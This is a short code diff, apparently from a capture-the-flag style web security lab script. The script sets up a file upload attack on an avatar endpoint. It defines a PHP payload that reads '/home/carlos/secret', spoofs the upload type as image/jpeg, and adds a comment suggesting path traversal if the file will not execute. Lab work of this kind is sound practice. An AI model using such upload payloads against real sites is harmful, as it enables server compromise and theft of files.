@@ -1,6 +1,8 @@
 const typeYouWant = `image/jpeg`;
 const payload = `<?php echo file_get_contents('/home/carlos/secret'); ?>`;
-const name="script2.php";
+// sometimes using path traversal could help if it wont execute
+const name="script.php";
+
 const csrfToken="getThisTOken probably need to this parameter asswell";
 const path = "/my-account/avatar";
 
